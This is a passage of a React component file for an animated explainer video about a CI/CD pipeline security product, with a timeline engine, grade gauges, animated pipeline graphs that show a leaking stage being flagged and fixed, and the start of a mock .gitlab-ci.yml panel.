// PlumberVideo.jsx — 40s animated explainer for Plumber (CI/CD pipeline security)
// Self-contained React island: timeline engine + scenes in one file. No external deps beyond React.
//
// Astro usage:
//   ---
//   import PlumberVideo from '../components/PlumberVideo.jsx';
//   ---
//   <div style="max-width:1100px;margin:auto;position:relative;aspect-ratio:16/9">
//     <PlumberVideo client:visible />
//   </div>
//
// Props: <PlumberVideo controls={false} loop autoplay />
//   controls  show the scrubber/playback bar (default false — set true for a demo/debug view)
//   loop      loop the 40s timeline (default true)
//   autoplay  start playing on mount (default true)
// Needs the "Space Grotesk" font loaded on the page (e.g. Google Fonts) for the intended type.
import React from "react";

/* ───────────────────────── Engine ───────────────────────── */
const Easing = {
  linear: (t) => t,
  easeInQuad: (t) => t * t,
  easeOutQuad: (t) => t * (2 - t),
  easeInOutQuad: (t) => (t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t),
  easeInCubic: (t) => t * t * t,
  easeOutCubic: (t) => (--t) * t * t + 1,
  easeInOutCubic: (t) => (t < 0.5 ? 4 * t * t * t : (t - 1) * (2 * t - 2) * (2 * t - 2) + 1),
  easeOutQuart: (t) => 1 - (--t) * t * t * t,
  easeInExpo: (t) => (t === 0 ? 0 : Math.pow(2, 10 * (t - 1))),
  easeOutExpo: (t) => (t === 1 ? 1 : 1 - Math.pow(2, -10 * t)),
  easeOutBack: (t) => { const c1 = 1.70158, c3 = c1 + 1; return 1 + c3 * Math.pow(t - 1, 3) + c1 * Math.pow(t - 1, 2); },
  easeInOutSine: (t) => -(Math.cos(Math.PI * t) - 1) / 2,
};
const clamp = (v, min, max) => Math.max(min, Math.min(max, v));
const lerp = (a, b, t) => a + (b - a) * t;
function interpolate(input, output, ease = Easing.linear) {
  return (t) => {
    if (t <= input[0]) return output[0];
    if (t >= input[input.length - 1]) return output[output.length - 1];
    for (let i = 0; i < input.length - 1; i++) {
      if (t >= input[i] && t <= input[i + 1]) {
        const span = input[i + 1] - input[i];
        const local = span === 0 ? 0 : (t - input[i]) / span;
        const easeFn = Array.isArray(ease) ? (ease[i] || Easing.linear) : ease;
        return output[i] + (output[i + 1] - output[i]) * easeFn(local);
      }
    }
    return output[output.length - 1];
  };
}
const win = (t, s, e, ease = Easing.easeOutCubic) => ease(clamp((t - s) / (e - s), 0, 1));

const TimelineContext = React.createContext({ time: 0, duration: 30, playing: false });
const useTime = () => React.useContext(TimelineContext).time;

function Stage({ width = 1920, height = 1080, duration = 30, background = '#070809', loop = true, autoplay = true, controls = false, persistKey = 'animstage', children }) {
  // Only restore/persist the playback position in QA mode (controls on):
  // the landing-page loop should always start from the beginning on load.
  const [time, setTime] = React.useState(() => { if (!controls) return 0; try { const v = parseFloat(localStorage.getItem(persistKey + ':t') || '0'); return isFinite(v) ? clamp(v, 0, duration) : 0; } catch { return 0; } });
  const [playing, setPlaying] = React.useState(autoplay);
  const [hoverTime, setHoverTime] = React.useState(null);
  const [scale, setScale] = React.useState(1);
  const stageRef = React.useRef(null), rafRef = React.useRef(null), lastTsRef = React.useRef(null);
  React.useEffect(() => { if (!controls) return; try { localStorage.setItem(persistKey + ':t', String(time)); } catch {} }, [time, persistKey, controls]);
  React.useEffect(() => {
    if (!stageRef.current) return; const el = stageRef.current;
    const measure = () => { const barH = controls ? 44 : 0; setScale(Math.max(0.05, Math.min(el.clientWidth / width, (el.clientHeight - barH) / height))); };
    measure(); const ro = new ResizeObserver(measure); ro.observe(el); window.addEventListener('resize', measure);
    return () => { ro.disconnect(); window.removeEventListener('resize', measure); };
  }, [width, height, controls]);
  React.useEffect(() => {
    if (!playing) { lastTsRef.current = null; return; }
    const step = (ts) => {
      if (lastTsRef.current == null) lastTsRef.current = ts;
      const dt = (ts - lastTsRef.current) / 1000; lastTsRef.current = ts;
      setTime((t) => { let next = t + dt; if (next >= duration) { if (loop) next = next % duration; else { next = duration; setPlaying(false); } } return next; });
      rafRef.current = requestAnimationFrame(step);
    };
    rafRef.current = requestAnimationFrame(step);
    return () => { if (rafRef.current) cancelAnimationFrame(rafRef.current); lastTsRef.current = null; };
  }, [playing, duration, loop]);
  React.useEffect(() => {
    if (!controls) return;
    const onKey = (e) => {
      if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA')) return;
      if (e.code === 'Space') { e.preventDefault(); setPlaying(p => !p); }
      else if (e.code === 'ArrowLeft') setTime(t => clamp(t - (e.shiftKey ? 1 : 0.1), 0, duration));
      else if (e.code === 'ArrowRight') setTime(t => clamp(t + (e.shiftKey ? 1 : 0.1), 0, duration));
      else if (e.key === '0' || e.code === 'Home') setTime(0);
    };
    window.addEventListener('keydown', onKey); return () => window.removeEventListener('keydown', onKey);
  }, [duration, controls]);
  const displayTime = hoverTime != null ? hoverTime : time;
  const ctxValue = React.useMemo(() => ({ time: displayTime, duration, playing, setTime, setPlaying }), [displayTime, duration, playing]);
  return (
    <div ref={stageRef} style={{ position: 'absolute', inset: 0, display: 'flex', flexDirection: 'column', alignItems: 'center', background: '#0a0a0a', fontFamily: 'Space Grotesk, system-ui, sans-serif' }}>
      <div style={{ flex: 1, width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', overflow: 'hidden', minHeight: 0 }}>
        <div style={{ width, height, background, position: 'relative', transform: `scale(${scale})`, transformOrigin: 'center', flexShrink: 0, boxShadow: '0 20px 60px rgba(0,0,0,0.4)', overflow: 'hidden' }}>
          <TimelineContext.Provider value={ctxValue}>{children}</TimelineContext.Provider>
        </div>
      </div>
      <PlaybackBar time={displayTime} duration={duration} playing={playing} onPlayPause={() => setPlaying(p => !p)} onReset={() => setTime(0)} onSeek={(t) => setTime(t)} onHover={(t) => setHoverTime(t)} controls={controls} />
    </div>
  );
}
function PlaybackBar({ time, duration, playing, onPlayPause, onReset, onSeek, onHover, controls = true }) {
  const trackRef = React.useRef(null); const [dragging, setDragging] = React.useState(false);
  const timeFromEvent = React.useCallback((e) => { const rect = trackRef.current.getBoundingClientRect(); return clamp((e.clientX - rect.left) / rect.width, 0, 1) * duration; }, [duration]);
  React.useEffect(() => {
    if (!dragging) return;
    const onUp = () => setDragging(false);
    const onMove = (e) => { if (trackRef.current) onSeek(timeFromEvent(e)); };
    window.addEventListener('mouseup', onUp); window.addEventListener('mousemove', onMove);
    return () => { window.removeEventListener('mouseup', onUp); window.removeEventListener('mousemove', onMove); };
  }, [dragging, timeFromEvent, onSeek]);
  const pct = duration > 0 ? (time / duration) * 100 : 0;
  const fmt = (t) => { const tot = Math.max(0, t); const m = Math.floor(tot / 60), s = Math.floor(tot % 60), cs = Math.floor((tot * 100) % 100); return `${m}:${String(s).padStart(2, '0')}.${String(cs).padStart(2, '0')}`; };
  const mono = 'JetBrains Mono, ui-monospace, monospace';
  if (!controls) return null;
  return (
    <div style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '8px 16px', background: 'rgba(20,20,20,0.92)', borderTop: '1px solid rgba(255,255,255,0.08)', width: '100%', maxWidth: 680, borderRadius: 8, color: '#f6f4ef', fontFamily: 'system-ui, sans-serif', userSelect: 'none', flexShrink: 0 }}>
      <IconBtn onClick={onReset} title="Return to start (0)"><svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M3 2v10M12 2L5 7l7 5V2z" stroke="currentColor" strokeWidth="1.5" strokeLinejoin="round" strokeLinecap="round"/></svg></IconBtn>
      <IconBtn onClick={onPlayPause} title="Play/pause (space)">{playing ? <svg width="14" height="14" viewBox="0 0 14 14"><rect x="3" y="2" width="3" height="10" fill="currentColor"/><rect x="8" y="2" width="3" height="10" fill="currentColor"/></svg> : <svg width="14" height="14" viewBox="0 0 14 14"><path d="M3 2l9 5-9 5V2z" fill="currentColor"/></svg>}</IconBtn>
      <div style={{ fontFamily: mono, fontSize: 12, fontVariantNumeric: 'tabular-nums', width: 64, textAlign: 'right' }}>{fmt(time)}</div>
      <div ref={trackRef} onMouseMove={(e) => { if (dragging) onSeek(timeFromEvent(e)); else onHover(timeFromEvent(e)); }} onMouseLeave={() => { if (!dragging) onHover(null); }} onMouseDown={(e) => { setDragging(true); onSeek(timeFromEvent(e)); onHover(null); }} style={{ flex: 1, height: 22, position: 'relative', cursor: 'pointer', display: 'flex', alignItems: 'center' }}>
        <div style={{ position: 'absolute', left: 0, right: 0, height: 4, background: 'rgba(255,255,255,0.12)', borderRadius: 2 }}/>
        <div style={{ position: 'absolute', left: 0, width: `${pct}%`, height: 4, background: '#00D400', borderRadius: 2 }}/>
        <div style={{ position: 'absolute', left: `${pct}%`, top: '50%', width: 12, height: 12, marginLeft: -6, marginTop: -6, background: '#fff', borderRadius: 6, boxShadow: '0 2px 4px rgba(0,0,0,0.4)' }}/>
      </div>
      <div style={{ fontFamily: mono, fontSize: 12, fontVariantNumeric: 'tabular-nums', width: 64, color: 'rgba(246,244,239,0.55)' }}>{fmt(duration)}</div>
    </div>
  );
}
function IconBtn({ children, onClick, title }) {
  const [h, setH] = React.useState(false);
  return <button onClick={onClick} title={title} onMouseEnter={() => setH(true)} onMouseLeave={() => setH(false)} style={{ width: 28, height: 28, display: 'flex', alignItems: 'center', justifyContent: 'center', background: h ? 'rgba(255,255,255,0.12)' : 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: 6, color: '#f6f4ef', cursor: 'pointer', padding: 0 }}>{children}</button>;
}

/* ───────────────────────── Palette ───────────────────────── */
const C = {
  bg: '#070809', ink: '#F5F5F5', dim: 'rgba(245,245,245,0.55)',
  green: '#00E000', greenBright: '#3BFF6A', greenDeep: '#008700',
  red: '#FF2D3D', redDeep: '#B30010',
  node: '#0d1417', nodeEdge: 'rgba(255,255,255,0.16)',
};
const GRADE = { A: '#00E000', B: '#8BE000', C: '#E8C400', D: '#F08A1E', E: '#FF2D3D' };
const MONO = 'JetBrains Mono, ui-monospace, monospace';
const DISP = 'Space Grotesk, system-ui, sans-serif';

function ScorePill({ grade, size = 30, glow = false }) {
  const col = GRADE[grade] || C.dim;
  return <div style={{ width: size, height: size, borderRadius: 7, display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'rgba(0,0,0,0.62)', border: `1.5px solid ${col}`, color: col, fontFamily: MONO, fontWeight: 700, fontSize: size * 0.52, boxShadow: glow ? `0 0 ${size * 0.5}px ${col}99` : 'none', lineHeight: 1 }}>{grade}</div>;
}

// Inline grade LABEL for use inside sentences/captions — a filled colour chip, not plain text.
function GradeChip({ g, size = 44 }) {
  const col = GRADE[g] || C.green;
  const txt = (g === 'D' || g === 'E') ? '#fff' : '#00140a';
  return <span style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', minWidth: size * 1.06, height: size * 1.06, padding: `0 ${size * 0.16}px`, borderRadius: size * 0.28, background: col, color: txt, fontFamily: DISP, fontWeight: 800, fontSize: size, lineHeight: 1, boxShadow: `0 0 ${size * 0.55}px ${col}55, inset 0 1px 0 rgba(255,255,255,0.25)`, transform: `translateY(-${size * 0.05}px)`, verticalAlign: 'middle' }}>{g}</span>;
}

// Minimal score = just the grade letter in its colour (no gauge, no label).
function ScoreLetter({ grade, size = 150 }) {
  const col = GRADE[grade] || C.dim;
  return <div style={{ fontFamily: DISP, fontWeight: 800, fontSize: size, lineHeight: 1, color: col, letterSpacing: '-0.03em', textShadow: `0 0 ${size * 0.3}px ${col}66, 0 2px 20px rgba(0,0,0,0.6)` }}>{grade}</div>;
}

// Plumber Score gauge: a red→green semicircle with a knob that sweeps E (left) → A (right).
// `p` ∈ [0,1] is the knob position; `grade` is the big centred letter.
// `card` wraps it in a panel with a "Plumber Score" label below; otherwise it's the bare dial.
const GAUGE_P = { A: 0.94, B: 0.73, C: 0.52, D: 0.31, E: 0.08 };
const GAUGE_SCALE = [['E', 0.1], ['D', 0.3], ['C', 0.5], ['B', 0.7], ['A', 0.9]];
function ScoreGauge({ grade, p, size = 232, card = false }) {
  const uid = React.useId().replace(/[:]/g, '');
  const gid = 'gg' + uid, fid = 'gf' + uid;
  const small = size < 150;
  const topPad = small ? 13 : 19;
  const w = size, h = size * 0.56;
  const cx = w / 2, cy = h * 0.98, r = w * 0.40, sw = Math.max(5, w * 0.066);
  const clp = clamp(p, 0, 1);
  const phi = Math.PI * (1 - clp);
  const kx = cx + r * Math.cos(phi), ky = cy - r * Math.sin(phi);
  const col = GRADE[grade] || C.dim;
  const arc = `M ${cx - r} ${cy} A ${r} ${r} 0 0 1 ${cx + r} ${cy}`;
  const R2 = r + sw / 2 + (small ? 9 : 13); // radius of the outer A–E scale letters
  const lfs = small ? 9.5 : 14.5;
  const gauge = (
    <svg width={w} height={h + sw * 1.4 + topPad} viewBox={`0 ${-topPad} ${w} ${h + sw * 1.4 + topPad}`} style={{ overflow: 'visible', display: 'block' }}>
      <defs>
        <linearGradient id={gid} x1="0" y1="0" x2="1" y2="0">
          <stop offset="0%" stopColor="#FF2D3D" />
          <stop offset="27%" stopColor="#F08A1E" />
          <stop offset="50%" stopColor="#E8C400" />
          <stop offset="74%" stopColor="#8BE000" />
          <stop offset="100%" stopColor="#00E000" />
        </linearGradient>
        <filter id={fid} x="-60%" y="-60%" width="220%" height="220%"><feGaussianBlur stdDeviation={small ? 1.6 : 3} result="b" /><feMerge><feMergeNode in="b" /><feMergeNode in="SourceGraphic" /></feMerge></filter>
      </defs>
      {/* recessed track */}
      <path d={arc} fill="none" stroke="rgba(255,255,255,0.08)" strokeWidth={sw + 5} strokeLinecap="round" />
      {/* colour arc */}
      <path d={arc} fill="none" stroke={`url(#${gid})`} strokeWidth={sw} strokeLinecap="round" filter={`url(#${fid})`} />
      {/* segment dividers */}
      {[0.2, 0.4, 0.6, 0.8].map((tp, i) => {
        const a = Math.PI * (1 - tp);
        return <line key={i} x1={cx + (r - sw / 2 - 1.5) * Math.cos(a)} y1={cy - (r - sw / 2 - 1.5) * Math.sin(a)} x2={cx + (r + sw / 2 + 1.5) * Math.cos(a)} y2={cy - (r + sw / 2 + 1.5) * Math.sin(a)} stroke={card ? 'rgba(12,16,18,0.94)' : C.bg} strokeWidth={small ? 2.4 : 3.5} />;
      })}
      {/* outer A–E scale — current grade is highlighted */}
      {GAUGE_SCALE.map(([lt, lp], i) => {
        const a = Math.PI * (1 - lp);
        const lx = cx + R2 * Math.cos(a), ly = cy - R2 * Math.sin(a);
        const active = lt === grade;
        return <text key={i} x={lx} y={ly + lfs * 0.34} textAnchor="middle" fontFamily={MONO} fontWeight={active ? 700 : 500} fontSize={active ? lfs * 1.08 : lfs} fill={active ? col : 'rgba(245,245,245,0.32)'}>{lt}</text>;
      })}
      {/* knob — neutral white so it stays visible over any arc colour */}
      <circle cx={kx} cy={ky} r={sw * 0.98} fill="#ffffff" opacity="0.28" filter={`url(#${fid})`} />
      <circle cx={kx} cy={ky} r={sw * 0.62} fill="#ffffff" stroke={col} strokeWidth={small ? 1 : 1.6} />
      <circle cx={kx} cy={ky} r={sw * 0.28} fill={card ? '#0c1012' : C.bg} />
      {/* big grade letter */}
      <text x={cx} y={cy - h * 0.02} textAnchor="middle" fontFamily={DISP} fontWeight="700" fontSize={h * 0.6} fill={col} style={{ letterSpacing: '-0.02em' }}>{grade}</text>
    </svg>
  );
  if (!card) return gauge;
  const pad = small ? '12px 16px 9px' : '22px 28px 17px';
  return (
    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: small ? 7 : 12, padding: pad, borderRadius: small ? 13 : 18, background: 'rgba(12,16,18,0.94)', border: '1px solid rgba(255,255,255,0.10)', boxShadow: `0 ${small ? 12 : 24}px ${small ? 32 : 64}px rgba(0,0,0,0.55), inset 0 1px 0 rgba(255,255,255,0.05), 0 0 ${small ? 18 : 30}px ${col}1f` }}>
      {gauge}
      <div style={{ fontFamily: MONO, fontSize: small ? 9.5 : 13, letterSpacing: small ? '0.16em' : '0.26em', textTransform: 'uppercase', color: 'rgba(245,245,245,0.62)' }}>Plumber Score</div>
    </div>
  );
}

/* ───────────────────────── Pipeline model (GitLab-style staged graphs) ───────────────────────── */
// Each pipeline = columns of stage-nodes (circles) connected like a CI/CD DAG. Leaks live ON a stage node.
const HERO = { hx: 776, hy: 560 };
// Fewer, cleaner pipelines: each is ONE horizontal CI/CD track with evenly-spaced stage
// stations and fluid flowing left→right — reads as a pipeline, not a generic node graph.
const PIPES = [
  { y: 180, sx: 104, gap: 336, cols: [[0], [0], [-34, 34], [0], [0], [0]], leak: { c: 3, r: 0 } },
  { y: 370, sx: 104, gap: 336, cols: [[0], [0], [0], [0], [0], [0]], leak: { c: 1, r: 0 } },
  { y: 560, sx: 104, gap: 336, cols: [[0], [0], [0], [0], [0], [0]], leak: { c: 2, r: 0 }, hero: true }, // HERO — clicked red node at (776,560)
  { y: 750, sx: 104, gap: 336, cols: [[0], [-32, 32], [0], [0], [0], [0]], leak: { c: 4, r: 0 } },
  { y: 930, sx: 104, gap: 336, cols: [[0], [0], [0], [0], [0], [0]], leak: { c: 2, r: 0 } },
];
const PIPE_META = [
  { bad: 'D', heal: 0.15 }, { bad: 'C', heal: 0.45 }, { bad: 'E', heal: 0.0 },
  { bad: 'D', heal: 0.6 }, { bad: 'C', heal: 0.3 },
];

function buildPipe(p) {
  const nodes = [], conns = [];
  p.cols.forEach((rows, ci) => rows.forEach((off, ri) => nodes.push({ ci, ri, x: p.sx + ci * p.gap, y: p.y + off, leak: p.leak && p.leak.c === ci && p.leak.r === ri })));
  for (let ci = 0; ci < p.cols.length - 1; ci++) {
    p.cols[ci].forEach((o1) => p.cols[ci + 1].forEach((o2) => {
      conns.push({ x1: p.sx + ci * p.gap, y1: p.y + o1, x2: p.sx + (ci + 1) * p.gap, y2: p.y + o2 });
    }));
  }
  return { nodes, conns };
}
// reveal time when scan line crosses x (scan runs 5.4→8.2 across -160..2080)
const revealTime = (x) => 5.4 + (clamp((x + 160) / 2240, 0, 1)) * 2.8;
// TIME-WARP: the Stage runs 40s of wall-time; this maps wall-time (new) back onto the original
// 35s cue schedule (old), stretching the beats that felt too short. All cue timestamps below
// stay in "old" time — every component reads TW(useTime()) so they get the extra breathing room.
const TW = (nt) => interpolate(
  [0, 5.0, 8.2, 11.6, 14.7, 17.7, 20.7, 23.6, 26.6, 29.3, 32.1, 35.9, 40],
  [0, 5.0, 7.2, 9.6, 12.7, 15.0, 18.0, 20.9, 23.9, 26.6, 29.4, 33.2, 35],
  Easing.linear
)(nt);
// camera: uniform zoom + vertical shift so the focused pipeline rises above the YAML panel
const camZoomFn = (t) => interpolate([0, 4, 8.5, 9.4, 10.5, 25.4, 26.6, 35], [2.0, 1.0, 1.0, 1.0, 1.6, 1.6, 1.0, 1.0], Easing.easeInOutCubic)(t);
const camShiftYFn = (t) => interpolate([0, 9.4, 10.5, 25.4, 26.6, 35], [0, 0, -180, -180, 0, 0], Easing.easeInOutCubic)(t);
const heroScreenYFn = (t) => HERO.hy + camShiftYFn(t);

function PipelineGraph({ p, idx, t, scanX, healAt, flowDim = 1, heroBlockedDim = 1, focus = 0 }) {
  const { nodes, conns } = buildPipe(p);
  const healed = t >= healAt;
  const R = 15 * (1 + 0.5 * focus); // hero pipeline grows on zoom
  // corruption: flow runs left→right; once it passes the compromised node it turns red and spreads downstream
  const leakNode = nodes.find(n => n.leak);
  const leakX = leakNode ? leakNode.x : Infinity;
  const corrupting = p.hero && t >= 11.0 && t < 23.0;
  const corruptFront = corrupting ? lerp(leakX, leakX + 490, win(t, 11.3, 12.7)) : leakX;
  return (
    <g>
      {/* pipe rails: wide dim casing + bright thin core = a tube, not a hairline */}
      {conns.map((c, i) => (
        <g key={'c' + i}>
          <line x1={c.x1} y1={c.y1} x2={c.x2} y2={c.y2} stroke="rgba(255,255,255,0.05)" strokeWidth={10 + 5 * focus} strokeLinecap="round" />
          <line x1={c.x1} y1={c.y1} x2={c.x2} y2={c.y2} stroke="rgba(180,200,190,0.18)" strokeWidth={2.5 + 1.5 * focus} strokeLinecap="round" />
        </g>
      ))}
      {/* fluid flowing through the pipe — a continuous left→right stream of dots */}
      {conns.map((c, i) => {
        const seed = (idx * 0.37 + i * 0.19) % 1;
        return [0, 1, 2].map((k) => {
          const phase = ((t * 0.34 + seed + k / 3) % 1);
          const px = lerp(c.x1, c.x2, phase), py = lerp(c.y1, c.y2, phase);
          const op = Math.sin(phase * Math.PI) * 0.8 * flowDim * (p.hero ? heroBlockedDim : 1);
          if (op < 0.04) return null;
          const corruptedDot = corrupting && px >= leakX;
          return <circle key={'f' + i + '_' + k} cx={px} cy={py} r={(healed ? 5 : 4.2) * (1 + 0.5 * focus)} fill={corruptedDot ? C.red : C.greenBright} opacity={op} filter={corruptedDot ? 'url(#rGlow)' : 'url(#gGlow)'} />;
        });
      })}
      {/* nodes */}
      {nodes.map((n, i) => {
        const isLeak = n.leak;
        const leakHealed = healed || (p.hero && t >= 23.0);
        const revealed = isLeak ? (t < 5.4 ? false : scanX > n.x) : true;
        const tR = isLeak ? revealTime(n.x) : 0;
        const ping = isLeak ? win(t, tR, tR + 0.6, Easing.easeOutCubic) : 0;
        const pulse = 0.5 + 0.5 * Math.sin(t * 6 + i);
        let fill = healed ? C.green : '#1a2a1e';
        let ring = healed ? C.green : 'rgba(0,224,0,0.45)';
        if (isLeak && !leakHealed) {
          const amt = revealed ? 1 : 0.32;
          fill = `rgba(255,45,61,${0.55 + 0.35 * pulse * amt})`;
          ring = C.red;
        }
        const corrupted = corrupting && !isLeak && !leakHealed && n.x > leakX && n.x <= corruptFront;
        if (corrupted) { fill = `rgba(255,45,61,${0.5 + 0.35 * pulse})`; ring = C.red; }
        return (
          <g key={'n' + i}>
            {/* vulnerability ping ring (one-shot on reveal) */}
            {isLeak && !leakHealed && ping > 0 && ping < 1 && (
              <circle cx={n.x} cy={n.y} r={R + 1 + ping * 30} fill="none" stroke={C.red} strokeWidth="3" opacity={(1 - ping) * 0.9} />
            )}
            {isLeak && !leakHealed && revealed && (
              <circle cx={n.x} cy={n.y} r={R + pulse * 5} fill="none" stroke={C.red} strokeWidth="2.5" opacity={0.5 + 0.3 * pulse} filter="url(#rGlow)" />
            )}
            <circle cx={n.x} cy={n.y} r={R} fill={fill} stroke={ring} strokeWidth="3"
              filter={((isLeak && !leakHealed && revealed) || corrupted) ? 'url(#rGlow)' : (healed ? 'url(#gGlow)' : 'none')} />
            {/* inner valve dot — makes each node read as a pipeline stage station */}
            <circle cx={n.x} cy={n.y} r={R * 0.34} fill={ring} opacity={0.85} />
            {/* drip from leaking node */}
            {isLeak && !leakHealed && revealed && (() => { const dp = (t * 0.9 + i) % 1; const dy = lerp(R + 2, R + 38, dp); const dop = dp < 0.85 ? (1 - dp) * 0.8 : 0; return <ellipse cx={n.x} cy={n.y + dy} rx={4} ry={6} fill={C.red} opacity={dop} />; })()}
          </g>
        );
      })}
    </g>
  );
}

/* ───────────────────────── Network ───────────────────────── */
function Network() {
  const t = TW(useTime());
  const scanX = interpolate([5.4, 7.2], [-160, 2080], Easing.easeInOutSine)(t);
  const scanning = t >= 5.4 && t <= 7.5;
  const scoresIn = win(t, 7.4, 8.2);
  const heroFocus = win(t, 9.4, 10.5) * (1 - win(t, 25.4, 26.2));
  const fadeOut = interpolate([32.4, 33.2], [1, 0], Easing.easeInOutSine)(t);

  return (
    <div style={{ position: 'absolute', inset: 0, opacity: fadeOut }}>
      <div style={{ position: 'absolute', inset: 0, background: 'radial-gradient(120% 90% at 50% 50%, rgba(0,40,16,0.16), transparent 60%)' }}/>
      <svg viewBox="0 0 1920 1080" style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }}>
        <defs>
          <filter id="gGlow" x="-200%" y="-200%" width="500%" height="500%"><feGaussianBlur stdDeviation="3.5" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
          <filter id="rGlow" x="-200%" y="-200%" width="500%" height="500%"><feGaussianBlur stdDeviation="4" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
        </defs>
        {PIPES.map((p, i) => {
          const meta = PIPE_META[i];
          const healAt = 26.6 + meta.heal * 2.6;
          const heroBlockedDim = (p.hero && t >= 13.2 && t < 23.0) ? 0.12 : 1;
          const focus = p.hero ? heroFocus : 0;
          const dim = p.hero ? 1 : (1 - 0.85 * heroFocus);
          return <g key={i} opacity={dim}><PipelineGraph p={p} idx={i} t={t} scanX={scanX} healAt={healAt} heroBlockedDim={heroBlockedDim} focus={focus} /></g>;
        })}
      </svg>

      {/* score badges (HTML overlay, scales with world) */}
      {scoresIn > 0.02 && t < 32.8 && PIPES.map((p, i) => {
        const meta = PIPE_META[i];
        const healAt = 26.6 + meta.heal * 2.6;
        const grade = t >= healAt ? 'A' : meta.bad;
        const firstY = p.y + (p.cols[0][0] || 0);
        const deliver = win(t, 7.4, 8.2, Easing.easeOutBack);
        const flipPop = t >= healAt ? (1 + 0.22 * (1 - win(t, healAt, healAt + 0.45))) : 1;
        const gp = lerp(GAUGE_P[meta.bad] || 0.1, GAUGE_P.A, win(t, healAt, healAt + 0.6, Easing.easeInOutCubic));
        const gw = 98;
        return (
          <div key={'s' + i} style={{ position: 'absolute', left: Math.max(2, p.sx - 74), top: firstY - 34, opacity: deliver, transform: `scale(${(0.6 + 0.4 * deliver) * flipPop})`, transformOrigin: 'center center' }}>
            <ScoreLetter grade={grade} size={64} />
          </div>
        );
      })}

      {/* scan wave */}
      {scanning && (
        <div style={{ position: 'absolute', top: 0, left: scanX, width: 4, height: '100%', background: `linear-gradient(180deg, transparent, ${C.greenBright}, transparent)`, boxShadow: `0 0 60px 24px ${C.green}55`, opacity: 0.9 }}/>
      )}
    </div>
  );
}

/* ───────────────────────── Mouse cursor (beat 3 click) ───────────────────────── */
function Cursor({ t }) {
  // appears 9.7, travels to hero node 9.8→10.4, click ripple 10.4, fades 10.9→11.3
  if (t < 9.6 || t > 11.4) return null;
  const appear = win(t, 9.6, 9.9);
  const move = win(t, 9.9, 10.4, Easing.easeInOutCubic);
  const fade = win(t, 10.9, 11.3, Easing.easeInCubic);
  const x = lerp(1480, HERO.hx + 8, move);
  const y = lerp(880, heroScreenYFn(t) + 8, move);
  const click = win(t, 10.4, 10.85, Easing.easeOutCubic);
  const press = (t >= 10.38 && t < 10.55) ? 0.85 : 1;
  const hy = heroScreenYFn(t);
  return (
    <div style={{ position: 'absolute', inset: 0, pointerEvents: 'none' }}>
      {click > 0 && click < 1 && (
        <div style={{ position: 'absolute', left: HERO.hx, top: hy, width: 12 + click * 70, height: 12 + click * 70, marginLeft: -(6 + click * 35), marginTop: -(6 + click * 35), borderRadius: '50%', border: `2px solid ${C.greenBright}`, opacity: (1 - click) * 0.9 }}/>
      )}
      <div style={{ position: 'absolute', left: x, top: y, opacity: appear * (1 - fade), transform: `scale(${press})`, filter: 'drop-shadow(0 2px 4px rgba(0,0,0,0.6))' }}>
        <svg width="30" height="30" viewBox="0 0 24 24"><path d="M5 2l13 8.5-5.5 1.2 3 6.3-2.8 1.3-3-6.3L5 18V2z" fill="#fff" stroke="#0a0a0a" strokeWidth="1"/></svg>
      </div>
    </div>
  );
}

/* ───────────────────────── Captions ───────────────────────── */
function Caption({ start, end, children }) {
  const t = TW(useTime());
  if (t < start - 0.05 || t > end + 0.05) return null;
  const inP = win(t, start, start + 0.45, Easing.easeOutCubic);
  const outP = win(t, end - 0.4, end, Easing.easeInCubic);
  const opacity = inP * (1 - outP);
  const ty = (1 - inP) * 22 - outP * 12;
  return (
    <div style={{ position: 'absolute', left: '50%', bottom: 120, transform: `translate(-50%, ${ty}px)`, opacity, width: 1480, textAlign: 'center' }}>
      <div style={{ display: 'inline-block', padding: '22px 48px', borderRadius: 20, background: 'rgba(7,8,9,0.46)', backdropFilter: 'blur(14px)', WebkitBackdropFilter: 'blur(14px)', border: '1px solid rgba(255,255,255,0.06)', boxShadow: '0 8px 50px rgba(0,0,0,0.4)' }}>
        {children}
      </div>
    </div>
  );
}
function Line({ text, size = 56 }) {
  return <div style={{ fontFamily: DISP, fontWeight: 600, fontSize: size, color: C.ink, letterSpacing: '-0.02em', lineHeight: 1.12, textShadow: '0 2px 30px rgba(0,0,0,0.85)' }}>{text}</div>;
}
function Kicker({ text, color = C.green }) {
  return <div style={{ display: 'inline-flex', alignItems: 'center', gap: 10, marginBottom: 18, fontFamily: MONO, fontSize: 17, letterSpacing: '0.22em', textTransform: 'uppercase', color }}>
    <span style={{ width: 8, height: 8, borderRadius: 8, background: color, boxShadow: `0 0 12px ${color}` }}/>{text}
  </div>;
}

/* ───────────────────────── YAML panel ───────────────────────── */
function YamlPanel() {
  const t = TW(useTime());
  const lines = [
    { txt: 'deploy:', c: '#7FB6FF' },
    { txt: '  script:', c: '#7FB6FF' },
    { skeleton: 0.46 }, { skeleton: 0.62 },
    { txt: 'CURL', c: C.red, danger: true }, { skeleton: 0.34 },
  ];
  const redPulse = 0.5 + 0.5 * Math.sin(t * 7);
  const strike = win(t, 22.5, 22.9);
  const collapse = win(t, 22.9, 23.4, Easing.easeInOutCubic);
  const dangerVisible = t >= 11.0;
  return (
    <div style={{ width: 720, background: 'rgba(10,13,15,0.97)', border: '1px solid rgba(255,255,255,0.12)', borderRadius: 14, overflow: 'hidden', boxShadow: '0 30px 90px rgba(0,0,0,0.6)' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '12px 16px', borderBottom: '1px solid rgba(255,255,255,0.08)', fontFamily: MONO, fontSize: 14, color: C.dim }}>
        <span style={{ width: 11, height: 11, borderRadius: 6, background: '#ff5f56' }}/><span style={{ width: 11, height: 11, borderRadius: 6, background: '#ffbd2e' }}/><span style={{ width: 11, height: 11, borderRadius: 6, background: '#27c93f' }}/>
        <span style={{ marginLeft: 10 }}>.gitlab-ci.yml</span>
      </div>
